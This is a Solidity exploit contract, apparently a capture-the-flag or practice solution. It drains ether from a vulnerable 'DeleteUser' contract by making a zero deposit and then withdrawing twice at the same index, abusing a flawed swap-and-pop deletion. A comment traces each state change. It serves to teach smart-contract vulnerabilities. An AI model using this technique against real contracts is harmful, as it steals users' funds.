pragma solidity 0.8.15;

import "hardhat/console.sol";

import "../DeleteUser.sol";

contract DeleteUserAttacker {
    DeleteUser public target;
    address public attackerWallet;

    constructor(address _target) payable {
        target = DeleteUser(_target);
        attackerWallet = msg.sender;
        console.log("attacker deposit1");
        target.deposit{value: 1 ether}();
        console.log("attacker deposit2");
        target.deposit();
        target.withdraw(1);
        target.withdraw(1);
        msg.sender.call{value: 1 ether}("");
    }
}

/**
 * Initial State:
 * Users:
 * [0] -> owner, 1 ether
 *
 * Victim Balance -> 1 ether
 *
 * //Step 1 Attacker Deposit 1 ether:
 * [0] -> owner, 1 ether
 * [1] -> attacker, 1 ether
 *
 * Victim Balance -> 2 ether
 *
 * //Step 2 Attacker Deposit 0 ether:
 * [0] -> owner, 1 ether
 * [1] -> attacker, 1 ether
 * [2] -> attacker, 0
 *
 * Victim Balance -> 2 ether
 *
 * //Step 3 Attacker Withdraw at Index 1:
 *
 * user -> attacker, 1 ether
 * amount -> 1 ether,
 *
 * after user = users[users.length-1];
 * [0] -> owner, 1 ether
 * [1] -> attacker, 1 ether
 * [2] -> attacker, 0
 *
 * users.pop();
 * [0] -> owner, 1 ether
 * [1] -> attacker, 1 ether
 *
 * Withdraw 1 ether
 *
 * Victim Balance -> 1 ether
 *
 * Step 4: Withdraw at Index 1:
 *
 * user -> attacker 1 ether,
 * amount -> 1 ether,
 *
 * after user = users[users.length-1];
 * [0] -> owner, 1 ether
 * [1] -> attacker, 1 ether
 *
 * users.pop();
 * [0] -> owner, 1 ether
 *
 * Withdraw 1 ether
 *
 * Victim Balance -> 0 ether
 */
